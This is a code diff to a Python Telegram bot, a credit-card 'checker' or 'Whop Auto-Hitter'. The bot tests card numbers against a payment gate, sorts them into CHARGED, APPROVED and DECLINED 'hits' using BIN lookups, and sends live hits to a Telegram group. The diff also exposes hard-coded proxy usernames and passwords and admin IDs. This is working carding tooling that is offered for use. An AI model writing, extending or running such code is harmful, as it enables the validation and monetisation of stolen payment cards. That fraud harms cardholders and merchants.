@@ -97,6 +97,16 @@ user_last_command_time = {}
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ADMIN_IDS = {6962534443, 8428369446}
 
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# BROADCAST — single target group.
+# Receives ONLY: CHARGED hits 💎 and APPROVED (insufficient funds / etc.) ✅
+# Declined / error / unknown results are NOT sent anywhere.
+#
+# ⚠️ Replace the placeholder with the real group ID (starts with -100).
+#    The bot must be a member with "Send Messages" permission.
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+CHARGED_GROUP_CHAT_ID = -1004437051761  # ← REPLACE with your group's chat ID
+
 DEFAULT_ADMIN_PROXIES = [
     "http://1351:IBd1Fk5CuUNZ@p103.squidproxies.com:9087",
     "http://1401:FVRHsSXw2DNK@p103.squidproxies.com:9238",
@@ -344,7 +354,11 @@ async def process_whop_check(message, proc_msg, user, user_id, formatted_cc, cc,
             otp_code = "N/A"
             elapsed = round(time.time() - start_time, 2)
 
+        # ── Classification ────────────────────────────────────────
+        # is_charged     → true only for ORDER_PLACED / charged
+        # is_approved    → true for INSUFFICIENT_FUNDS, INCORRECT_CVC, 3DS, etc.
         is_charged = False
+        is_approved = False
         msg_lower = res_message.lower()
 
         if status_raw == "CHARGED" and ("placed successfully" in msg_lower or "order placed" in msg_lower):
@@ -352,13 +366,11 @@ async def process_whop_check(message, proc_msg, user, user_id, formatted_cc, cc,
             is_charged = True
         elif status_raw in ("APPROVED", "LIVE") or any(k in msg_lower for k in ["insufficient funds", "incorrect cvc", "security code", "3d", "authenticate", "zip code"]):
             final_status = f'𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 <tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">✅</tg-emoji>'
-            is_charged = False
+            is_approved = True
         elif status_raw == "DECLINED" or any(k in msg_lower for k in ["declined", "card_declined", "do_not_honor", "generic_decline", "incomplete", "failed"]):
             final_status = f'𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 <tg-emoji emoji-id=\"{CUSTOM_DECLINED_EMOJI_ID}\">❌</tg-emoji>'
-            is_charged = False
         else:
             final_status = f'𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 <tg-emoji emoji-id=\"{CUSTOM_DECLINED_EMOJI_ID}\">❌</tg-emoji>'
-            is_charged = False
 
         try:
             bin_info = await get_bin_info(cc[:6])
@@ -443,33 +455,25 @@ async def process_whop_check(message, proc_msg, user, user_id, formatted_cc, cc,
                     except Exception:
                         pass
 
-        if is_charged or status_raw in ("APPROVED", "LIVE"):
-            hit_badge = "CHARGED 💎" if is_charged else "APPROVED ✅"
-            log_caption = (
-                f"<b>Hit ➔</b> {hit_badge}\n"
-                f"<b>GATE ➔</b> Whop Auto-Hitter\n"
-                f"<b>Res ➔</b> {html.escape(str(res_message or 'Approved'))}\n"
-                f"<b>USER ➔</b> {user_display}"
-            )
-            reply_markup_logs = InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="𝗖𝗵𝗲𝗰𝗸 𝗬𝗼𝘂𝗿 𝗖𝗮𝗿𝗱𝘀", url="https://t.me/zlatanchecker_bot", style="primary")]
-            ])
+        # ── Broadcast — SINGLE group, CHARGED + APPROVED only ──
+        if is_charged or is_approved:
+            if is_charged:
+                header = "<b>💎 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 𝗛𝗜𝗧 💎</b>"
+            else:
+                header = "<b>✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 𝗛𝗜𝗧 ✅</b>"
+
+            broadcast_text = f"{header}\n━━━━━━━━━━━━━━━━\n{final_caption}"
 
             try:
-                await safe_send_message(message.bot,
-                    chat_id=-1004462990283,
-                    text=log_caption,
-                    parse_mode="HTML",
-                    reply_markup=reply_markup_logs,
-                )
-                await safe_send_message(message.bot,
-                    chat_id=-1004348615901,
-                    text=final_caption,
+                await safe_send_message(
+                    message.bot,
+                    chat_id=CHARGED_GROUP_CHAT_ID,
+                    text=broadcast_text,
                     parse_mode="HTML",
                     reply_markup=reply_markup,
                 )
             except Exception as e:
-                logging.error(f"Failed to broadcast whop hit: {e}")
+                logging.error(f"Whop broadcast → CHARGED_GROUP_CHAT_ID failed: {e}")
 
     except Exception as fatal_err:
         logging.error(f"Fatal unhandled exception in process_whop_check: {fatal_err}", exc_info=True)
